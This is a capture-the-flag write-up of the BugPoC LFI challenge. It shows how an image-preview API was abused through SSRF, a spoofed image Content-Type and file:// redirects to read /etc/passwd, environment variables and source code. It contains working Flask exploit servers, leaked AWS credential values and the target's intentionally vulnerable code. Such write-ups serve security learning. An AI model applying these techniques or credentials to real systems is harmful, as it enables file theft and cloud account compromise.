@@ -1,0 +1,612 @@
+---
+layout: page
+title: BugPoC LFI Challenge
+date: 05/10/2020
+description: My solution for the BugPoC LFI Challenge
+---
+
+<p>On the 30th of September/1st of October, BugPoc <a href="https://twitter.com/bugpoc_official/status/1311491862738481157" target="_blank">released</a> a Local File Inclusion (LFI) challenge where the objective was stealing a <code>/etc/passwd</code> file via <a href="http://social.buggywebsite.com/" target="_blank">social.buggywebsite.com</a> website.</p>
+
+<div class="flexcontainer">
+    <a class="link-box" href="#recon">Recon</a>
+    <a class="link-box" href="#ssrf">SSRF</a>
+    <a class="link-box" href="#images">Images</a>
+    <a class="link-box" href="#lfi">LFI</a>
+    <a class="link-box" href="#bugpoc">BugPoc POC</a>
+    <a class="link-box" href="#bonus">Bonus Points</a>
+</div>
+
+<hr>
+
+<h2 id="recon">Recon</h2>
+
+<p>On the provided website (<a href="http://social.buggywebsite.com/" target="_blank">social.buggywebsite.com</a>), only the following form was shown.</p>
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/1.png">
+
+<p>By typing anything on the input field, a serie of share buttons started to appear.</p>
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/2.png">
+
+<p>I reviewed the source code and saw that only one JavaScript file was being loaded, <code>/script-min.js</code>.</p>
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/3.png">
+
+<p>Since reading that one-line garbage is a headache, I used the pretty print option from the browser.</p>
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/4.png">
+
+<p>The interesting code from this file is the following function where the endpoint <code>/website-preview</code> is called.</p>
+
+<pre class="prettyprint linenums">
+function processUrl(e) {
+  requestTime = Date.now(),
+  url = 'https://api.buggywebsite.com/website-preview';
+  var t = new XMLHttpRequest;
+  t.onreadystatechange = function () {
+    4 == t.readyState && 200 == t.status ? (response = JSON.parse(t.responseText), populateWebsitePreview(response))  : 4 == t.readyState && 200 != t.status && (console.log(t.responseText), document.getElementById('website-preview').style.display = 'none')
+  },
+  t.open('POST', url, !0),
+  t.setRequestHeader('Content-Type', 'application/json; charset=UTF-8'),
+  t.setRequestHeader('Accept', 'application/json'),
+  data = {
+    url: e,
+    requestTime: requestTime
+  },
+  t.send(JSON.stringify(data))
+}
+</pre>
+
+<p>I forced the execution with a random URL (<code>http://google.com</code>) as an argument and the following POST request was sent.</p>
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/5.png">
+
+<h2 id="ssrf">SSRF</h2>
+
+<p>I went with the most obvious thing and tried to directly retrieve the file by replacing the <code>url</code> parameter with the file path, but as expected this was not as easy.</p> 
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/6.png">
+
+<p>Next, I used Burp Collaborator to verify there was indeed a SSRF.</p>
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/7.png">
+
+<p>Yes, I was receiving HTTP interaction from the application which was trying to connect to the collaborator url.</p>
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/8.png">
+
+<p>I tried with the usual SSRF payloads by using different protocols, but the application only seemed to accept <code>http</code> / <code>https</code> and any other payload resulted in the <i>"unable to fetch website preview"</i> error.</p>
+
+<p>When the URL was valid, the response contained details about a <code>title</code> and a <code>description</code>, probably referencing the title and description which are shown when a URL is shared in most platforms like Twitter, Telegram... This is achieved by including <code>meta</code> tags on the website <code>head</code>, so I served the following HTML code to reproduce it.</p>
+
+<pre class="prettyprint linenums">
+&lt;html>
+&lt;head>
+  &lt;meta property="og:title" content="mytitle">
+  &lt;meta property="og:description" content="mydesc">
+&lt;/head>
+&lt;body>
+&lt;/body>
+&lt;/html>
+</pre>
+
+<p>And yeah, when requesting that URL, my title and description were returned.</p> 
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/9.png">
+
+<p>I tried to inject plenty of payloads on those attributes, SSTI (<code>&lcub;&lcub;7*7}}</code>), PHP (<code>&lt;?php echo caca;?></code>)..., but none of that worked as it was always returned as is.</p>
+
+<h2 id="images">Images</h2>
+
+<p>Seeing I was going nowhere with that, I changed the URL and noticed that by introducing my website (<code>https://hipotermia.pw</code>) an additional field <code>image</code> appeared.</p>
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/10.png">
+
+<p>This was because my website also includes the image meta tag and even though that field wasn't displayed in the response by default, the application was also processing it.</p>
+
+<p>I modified my custom website and included an image meta tag which referenced another endpoint controlled by me.</p>
+
+<pre class="prettyprint linenums">
+&lt;html>
+&lt;head>
+  &lt;meta property="og:title" content="mytitle">
+  &lt;meta property="og:description" content="mydesc">
+  &lt;meta property="og:image" content="http://X.X.X.X/x">
+&lt;/head>
+&lt;body>
+&lt;/body>
+&lt;/html>
+</pre>
+
+<p>But now when retrieving it, the application complained about the image URL.</p> 
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/11.png">
+
+<p>So I changed the image URL and added a <code>.png</code> extension to it.</p>
+
+<pre class="prettyprint linenums">
+&lt;html>
+&lt;head>
+  &lt;meta property="og:title" content="mytitle">
+  &lt;meta property="og:description" content="mydesc">
+  &lt;meta property="og:image" content="http://X.X.X.X/x.png">
+&lt;/head>
+&lt;body>
+&lt;/body>
+&lt;/html>
+</pre>
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/12.png">
+
+<p>The error changed, now the problem was some kind of HEAD test.</p>
+
+<p>Changed again my code and now instead of a random file, I was returning a valid png image.</p>
+
+<pre class="prettyprint linenums">
+&lt;html>
+&lt;head>
+  &lt;meta property="og:title" content="mytitle">
+  &lt;meta property="og:description" content="mydesc">
+  &lt;meta property="og:image" content="http://X.X.X.X/valid.png">
+&lt;/head>
+&lt;body>
+&lt;/body>
+&lt;/html>
+</pre>
+
+<p>As seen before, the image was returned in base64.</p>
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/13.png">
+
+<p>And noticed that before fetching the real image, a HEAD request was sent.</p>
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/14.png">
+
+<p>This was probably to ensure that the fetched resource was indeed an image before really retrieving it, so I needed to return a valid image when a HEAD request was sent and then my payload with the GET.</p>
+
+<p>To accomplish this, I wrote the following Flask application.</p> 
+
+<pre class="prettyprint linenums">
+from flask import Flask, send_file, redirect
+
+app = Flask(__name__)
+
+@app.route('/')
+def i():
+    return('''&lt;html>
+&lt;head>
+    &lt;meta property="og:title" content="mytitle">
+    &lt;meta property="og:description" content="mydesc">
+    &lt;meta property="og:image" content="http://X.X.X.X/x.png">
+&lt;/head>
+&lt;body>
+&lt;/body>
+&lt;/html>''')
+
+@app.route('/x.png', methods=['HEAD'])
+def d():
+    return send_file('valid.png')
+
+@app.route('/x.png',methods=['GET'])
+def oo():
+    return redirect('file:///etc/passwd')
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0',port=80)
+</pre>
+
+<p>This resulted that when a HEAD request was received, a valid png was sent, and if it was a GET, a redirection to <code>file:///etc/passwd</code> instead.</p>
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/15.png">
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/16.png">
+
+<p>Unfortunately, I didn't receive the file, but got a different error message.</p>
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/17.png">
+
+<p>I was on the right track, since I was receiving a GET request to the redirection endpoint  after the HEAD, that meant that I bypassed the HEAD test.</p> 
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/18.png">
+
+<p>I thought that <i>"Unable to Process Image"</i> could meant that it was correctly fetching the <code>/etc/passwd</code> file, but as it was expecting a PNG image it couldn't decode it. But what if I used a different image format? SVG can be read in plain text, so I tried to read a simple string (<code>caca</code>) using that format to check the behavior.</p>
+
+<pre class="prettyprint linenums">
+from flask import Flask, send_file
+
+app = Flask(__name__)
+
+@app.route('/')
+def i():
+    return('''&lt;html>
+&lt;head>
+    &lt;meta property="og:title" content="mytitle">
+    &lt;meta property="og:description" content="mydesc">
+    &lt;meta property="og:image" content="http://X.X.X.X/x.svg">
+&lt;/head>
+&lt;body>
+&lt;/body>
+&lt;/html>''')
+
+@app.route('/x.svg', methods=['HEAD'])
+def d():
+    return send_file('valid.svg')
+
+@app.route('/x.svg',methods=['GET'])
+def oo():
+    return 'caca'
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0',port=80)
+</pre>
+
+<p>Yes, I could successfully retrieve that string on the application's response even though it wasn't a real image.</p>
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/19.png">
+
+<p>At that point, I also noticed that I didn't need to send a real image to bypass the HEAD test, I just needed to send an additional <code>Content-Type</code> header in my response with a valid image format, so I could accomplish the same behavior with this code.</p>
+
+<pre class="prettyprint linenums">
+from flask import Flask, Response
+
+app = Flask(__name__)
+
+@app.route('/')
+def i():
+    return('''&lt;html>
+&lt;head>
+    &lt;meta property="og:title" content="mytitle">
+    &lt;meta property="og:description" content="mydesc">
+    &lt;meta property="og:image" content="http://X.X.X.X/x.svg">
+&lt;/head>
+&lt;body>
+&lt;/body>
+&lt;/html>''')
+
+@app.route('/x.svg')
+def d():
+    return Response('caca', headers={'Content-Type': 'image/svg+xml'})
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0',port=80)
+</pre>
+
+<h2 id="lfi">LFI</h2>
+
+<p>Finally, I just had to change the response to a redirection to <code>/etc/passwd</code>.</p>
+
+<pre class="prettyprint linenums">
+from flask import Flask, Response
+
+app = Flask(__name__)
+
+@app.route('/')
+def i():
+    return('''&lt;html>
+&lt;head>
+    &lt;meta property="og:title" content="mytitle">
+    &lt;meta property="og:description" content="mydesc">
+    &lt;meta property="og:image" content="http://X.X.X.X/x.svg">
+&lt;/head>
+&lt;body>
+&lt;/body>
+&lt;/html>''')
+
+@app.route('/x.svg')
+def d():
+    return Response(headers={'Content-Type': 'image/svg+xml', 'Location': 'file:///etc/passwd'}, status=302)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0',port=80)
+</pre>
+
+<p>So any request to that endpoint returned the following response.</p>
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/20.png">
+
+<p>Resulting finally in the application being redirected to the local file and returning it in the response as it was a the meta image, being able to fetch <code>/etc/passwd</code> (or any other file).</p>
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/21.png">
+
+<h2 id="bugpoc">BugPoc POC</h2>
+
+<p>The challenge required the submission of a proof-of-concept using BugPoc, so the first step was creating a <a href="https://bugpoc.com/testers/other/mock" target="_blank">mock endpoint</a> which redirected to <code>/etc/passwd</code> and since this URL had to end in <code>.svg</code> to let the application think this was an image, I added that to the response body, because this was at the end of the URL. (<a href="https://mock.bugpoc.ninja/bdf9591d-a082-40e6-9277-3357a4ba3c00/m?sig=2460036b6ee12be9c92f148efd5d78102b148a7e115ee71ff6f3b8159166e308&statusCode=302&headers=%7B%22Location%22%3A%22file%3A%2F%2F%2Fetc%2Fpasswd%22%2C%22Content-Type%22%3A%22image%2Fsvg%2Bxml%22%7D&body=hello.svg" target="_blank"><code>result</code></a>)</p>
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/22.png">
+
+<p>Then, create another <a href="https://bugpoc.com/testers/other/mock" target="_blank">mock endpoint</a> to return the malicious HTML page which included the above URL in the meta image tag. (<a href="https://mock.bugpoc.ninja/bdf9591d-a082-40e6-9277-3357a4ba3c00/m?sig=946e3f0b52598fccbb14f784916ea61cfb9cf0a98b149ac3012263cc2fae8464&statusCode=200&headers=%7B%22Content-Type%22%3A%22text%2Fhtml%22%7D&body=%3Chtml%3E%0A%3Chead%3E%0A%20%20%3Cmeta%20property%3D%22og%3Atitle%22%20content%3D%22mytitle%22%3E%0A%20%20%3Cmeta%20property%3D%22og%3Adescription%22%20content%3D%22mydesc%22%3E%0A%20%20%3Cmeta%20property%3D%22og%3Aimage%22%20content%3D%22https%3A%2F%2Fmock.bugpoc.ninja%2Fbdf9591d-a082-40e6-9277-3357a4ba3c00%2Fm%3Fsig%3D2460036b6ee12be9c92f148efd5d78102b148a7e115ee71ff6f3b8159166e308%26statusCode%3D302%26headers%3D%257B%2522Location%2522%253A%2522file%253A%252F%252F%252Fetc%252Fpasswd%2522%252C%2522Content-Type%2522%253A%2522image%252Fsvg%252Bxml%2522%257D%26body%3Dhello.svg%22%3E%0A%3C%2Fhead%3E%0A%3Cbody%3E%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E" target="_blank"><code>result</code></a>)</p>
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/23.png">
+
+<p>Finally, an <a href="https://bugpoc.com/testers/http" target="_blank">HTTP PoC</a> with the POST request required to retrieve the content of <code>/etc/passwd</code> using the above mock endpoint.</p>
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/24.png">
+
+<p>This generates the following URL and password that can be sent to the triager so only the <i>Run</i> button needs to be clicked to verify the vulnerability, no need to run or maintain any local services.</p>
+
+<ul>
+<li>URL: <a href="https://bugpoc.com/poc#bp-A49qworh" target="_blank">https://bugpoc.com/poc#bp-A49qworh</a></li>
+<li>Password: <code>pAsSiVECUsCUS25</code></li>
+</ul>
+
+<h2 id="bonus">Bonus Points</h2>
+
+<p>On the last day, BugPoc challenged all participants to retrieve the source code and cloud metadata to get bonus points.</p> 
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/25.png">
+
+<p>I first tried to get the cloud metadata through the cloud magic IP (<code>169.254.169.254</code>), but the application didn't seem to be able to connect to it, so I tried to fetch the process environmental variables from <code>file:///proc/self/environ</code>.</p>
+
+<pre class="prettyprint linenums">
+from flask import Flask, Response
+
+app = Flask(__name__)
+
+@app.route('/')
+def i():
+    return('''&lt;html>
+&lt;head>
+    &lt;meta property="og:title" content="mytitle">
+    &lt;meta property="og:description" content="mydesc">
+    &lt;meta property="og:image" content="http://X.X.X.X/x.svg">
+&lt;/head>
+&lt;body>
+&lt;/body>
+&lt;/html>''')
+
+@app.route('/x.svg')
+def d():
+    return Response(headers={'Content-Type': 'image/svg+xml', 'Location': 'file:///proc/self/environ'}, status=302)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0',port=80)
+</pre>
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/26.png">
+
+<p>From this response, I could deduce the service was running on AWS Lambda.</p>
+
+<pre class="prettyprint long">
+AWS_LAMBDA_FUNCTION_VERSION=$LATEST
+AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEKj//////////wEaCXVzLXdlc3QtMiJHMEUCIQDVRq1PgOPdoOGZkfve68Fp9hPPmDTv0JUzhrC7jeEdcgIgD+fQBfTma2vTDSzTI3ex3ibCflDZhRLjIdbgy7P00vAq2wEI0f//////////ARABGgwwMTA1NDQ0MzkyMTAiDN/Kq8TIxxTL8pWj4iqvAQVC64MHCPq0yF+R/tRQQ2k53UL3CmL9cqnG5mi8v1aFGPu226UUn8ApFJdnlQ/tX7++YsyUgGZNdIFcu5vdGndZ21P1FLFM92w/lVeFn+WYX0NTUhqNC8+q/5QleeivkFBbwkzlKyluQn+iG2Tt309wa6tbjXbjK3e9fYWR8y9Rnpa+xz39RYvz+4CTgY/xEFZXAE8DfIUN7TTEtmXB26xj/4zWprwg7rrzJUKlCHswjZjr+wU64AGEUr2IOpe5Y3uNEBWf1x8IdIRKTWXUUyPNZKPQFRGQIFuLIVSuA4qZtAslsrRTBC7ghhU+Shi+tM1mC49EvzbKijIRxobx6JdlHHjpGf/QFI8zQSwpU6QYzPK7Ht14Y9KwY0gMJbVsij52nBkYCIYpIpZ88wyaKmihSXYvusm5Gu6MwriYqMlJxgVNrXFc+rEbUE9xxlKa9KgutdPciW1EneovhhnXSGOKN/d0yZHe1x7KWD+Pb0OtJZQbu+7Ch0lo4Cf9KOuP5gpNL4IOu2ylGFZTsCkMY/J8PIv7hU6cZQ==
+LAMBDA_TASK_ROOT=/var/task
+AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/get-website-preview
+LD_LIBRARY_PATH=/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib
+AWS_LAMBDA_LOG_STREAM_NAME=2020/10/05/[$LATEST]ca2c581c473e46bcb892e83670d329a6
+AWS_LAMBDA_RUNTIME_API=127.0.0.1:9001
+AWS_EXECUTION_ENV=AWS_Lambda_python3.8
+AWS_LAMBDA_FUNCTION_NAME=get-website-preview
+AWS_XRAY_DAEMON_ADDRESS=169.254.79.2:2000
+PATH=/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin
+AWS_DEFAULT_REGION=us-west-2
+PWD=/var/task
+AWS_SECRET_ACCESS_KEY=NsHmEAsr29XoLQmSTCP9MY+REM1ezmuTFkFymOzk
+LAMBDA_RUNTIME_DIR=/var/runtime
+LANG=en_US.UTF-8
+AWS_REGION=us-west-2
+TZ=:UTC
+AWS_ACCESS_KEY_ID=ASIAQE5D7L6VJTKVZMUX
+SHLVL=0
+_AWS_XRAY_DAEMON_ADDRESS=169.254.79.2
+_AWS_XRAY_DAEMON_PORT=2000
+_LAMBDA_TELEMETRY_LOG_FD=3
+AWS_XRAY_CONTEXT_MISSING=LOG_ERROR
+_HANDLER=lambda_function.lambda_handler
+AWS_LAMBDA_FUNCTION_MEMORY_SIZE=512
+</pre>
+
+<p>Since credentials are included on these properties, I could login as the user running the service using <code>aws-cli</code>.</p>
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/27.png">
+
+<p>I tried to enumerate what I could do with this user, but it didn't look like it had permissions to list or do almost anything, something understandable as everyone completing the challenge would have access to it.</p>
+
+<p>Luckily, I already had all the information I needed to retrieve the source code.</p>
+
+<ul>
+  <li><code>AWS_EXECUTION_ENV=AWS_Lambda_python3.8</code> ➡️ Python code.</li>
+  <li><code>LAMBDA_TASK_ROOT=/var/task</code> ➡️ The path to the Lambda function code.</li>
+</ul>
+
+<p>So I fetched <code>file:///var/task/lambda_function.py</code> which is the default filename when using Python Lambdas on AWS.</p>
+
+<pre class="prettyprint linenums linenums">
+from flask import Flask, Response
+
+app = Flask(__name__)
+
+@app.route('/')
+def i():
+    return('''&lt;html>
+&lt;head>
+    &lt;meta property="og:title" content="mytitle">
+    &lt;meta property="og:description" content="mydesc">
+    &lt;meta property="og:image" content="http://X.X.X.X/x.svg">
+&lt;/head>
+&lt;body>
+&lt;/body>
+&lt;/html>''')
+
+@app.route('/x.svg')
+def d():
+    return Response(headers={'Content-Type': 'image/svg+xml', 'Location': 'file:///var/task/lambda_function.py'}, status=302)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0',port=80)
+</pre>
+
+<img class="img-fluid" src="/static/img/bb/bugpoc-lfi-challenge/28.png">
+
+<p>And finally, I had the application source code.</p>
+
+<pre class="prettyprint linenums long">
+import json
+import requests
+from bs4 import BeautifulSoup
+from urllib.parse import urlparse
+import fleep
+import base64
+import os
+import sys
+from urllib.request import url2pathname
+
+class LocalFileAdapter(requests.adapters.BaseAdapter):
+    """Protocol Adapter to allow Requests to GET file:// URLs
+
+    @todo: Properly handle non-empty hostname portions.
+    """
+
+    @staticmethod
+    def _chkpath(method, path):
+        """Return an HTTP status for the given filesystem path."""
+        if method.lower() in ('put', 'delete'):
+            return 501, "Not Implemented"  # TODO
+        elif method.lower() not in ('get', 'head'):
+            return 405, "Method Not Allowed"
+        elif os.path.isdir(path):
+            return 400, "Path Not A File"
+        elif not os.path.isfile(path):
+            return 404, "File Not Found"
+        elif not os.access(path, os.R_OK):
+            return 403, "Access Denied"
+        else:
+            return 200, "OK"
+
+    def send(self, req, **kwargs):  # pylint: disable=unused-argument
+        """Return the file specified by the given request
+
+        @type req: C{PreparedRequest}
+        @todo: Should I bother filling `response.headers` and processing
+               If-Modified-Since and friends using `os.stat`?
+        """
+        path = os.path.normcase(os.path.normpath(url2pathname(req.path_url)))
+        response = requests.Response()
+
+        response.status_code, response.reason = self._chkpath(req.method, path)
+        if response.status_code == 200 and req.method.lower() != 'head':
+            try:
+                response.raw = open(path, 'rb')
+            except (OSError, IOError) as err:
+                response.status_code = 500
+                response.reason = str(err)
+
+        if isinstance(req.url, bytes):
+            response.url = req.url.decode('utf-8')
+        else:
+            response.url = req.url
+
+        response.request = req
+        response.connection = self
+
+        return response
+
+    def close(self):
+        pass
+
+def get_og(url):
+  r = requests.get(url,headers={'user-agent':'Buggybot/1.0'})
+  soup = BeautifulSoup(r.text, 'html.parser')
+  metas = soup.find_all('meta', attrs={"property":True})
+  ogs = {meta['property']:meta['content'] for meta in metas if meta['property'].startswith('og:')}
+  return {
+    'title':ogs.get('og:title',''),
+    'description':ogs.get('og:description',''),
+    'image_url':ogs.get('og:image',''),
+  }
+
+def get_image_bytes(image_url):
+  # set up requests session like stack overflow told me to
+  requests_session = requests.session()
+  requests_session.mount('file://', LocalFileAdapter())
+  # verify the thing we are about to download is an image
+  r_head = requests_session.head(image_url, stream=True, headers={'user-agent':'Buggybot/1.0'})
+  if not ('image' in r_head.headers.get('Content-Type') or 'image' in r_head.headers.get('content-type')):
+    raise Exception("Image Failed HEAD Test")
+  # download thing
+  r = requests_session.get(image_url, stream=True, headers={'user-agent':'Buggybot/1.0'})
+  img = r.content
+  return img
+
+def get_image_mimetype(image_bytes):
+  f = fleep.get(image_bytes)
+  if len(f.mime) > 0:
+    return f.mime[0]
+  else:
+    return ''
+  
+valid_image_extensions = ['.jpg','.png','.gif','.svg']
+def get_image_content(image_url):
+  # verify the url has an acceptable extension
+  has_valid_extension = any([ext in image_url for ext in valid_image_extensions])
+  # verify the url starts with http
+  if image_url.startswith('http') and has_valid_extension:
+    # download the image content
+    image_bytes = get_image_bytes(image_url)
+    if image_bytes == None:
+      raise Exception('Not Found')
+    # check file magic bytes
+    mimetype = get_image_mimetype(image_bytes)
+    if '.jpg' in image_url and mimetype == 'image/jpeg':
+      return (base64.b64encode(image_bytes),True,mimetype)
+    elif '.png' in image_url and mimetype == 'image/png':
+      return (base64.b64encode(image_bytes),True,mimetype)
+    elif '.gif' in image_url and mimetype == 'image/gif':
+      return (base64.b64encode(image_bytes),True,mimetype)
+    elif '.svg' in image_url:
+      # svg is basically a text file. no need to look at magic bytes
+      return (image_bytes ,False,'image/svg+xml')
+    else:
+      raise Exception('Unable to Process Image')
+  else:
+    raise Exception('Invalid Image URL')
+  
+def lambda_handler(event, context):
+
+  try:
+    # get url from request
+    body = event.get('body','')
+    json_body = json.loads(body)
+    url = json_body['url']
+    
+    # get the request time
+    request_time = int(json_body['requestTime'])
+    
+    # get open graph data
+    og_data = get_og(url)
+    
+    # add the request time
+    og_data['requestTime'] = request_time;
+    
+    # add parsed domain
+    og_data['domain'] = urlparse(url).netloc
+    
+    if og_data['image_url'] != '':
+      try:
+        # attempt to download the image content
+        (img,needed_encoding,mimetype) = get_image_content(og_data['image_url'])
+        img_json = {
+          'content' : img.decode(),
+          'encoded' : needed_encoding,
+          'mimetype' : mimetype
+        }
+        og_data['image'] = img_json
+      except Exception as e:
+        og_data['image'] = {'error':str(e)}
+        
+    # remove the og:image
+    del og_data['image_url']
+    
+    return {
+      'statusCode': 200,
+      'body': json.dumps(og_data),
+      'headers': {'access-control-allow-origin': '*'}
+    }
+  except Exception as e:
+    return {
+      'statusCode': 400,
+      'body':'Error, unable to fetch website preview',
+      'headers': {'access-control-allow-origin': '*'}
+    }
+</pre>
+
+<p>Thanks again to <a href="https://bugpoc.com/" target="_blank">BugPoc</a> for the awesome challenge!</p>
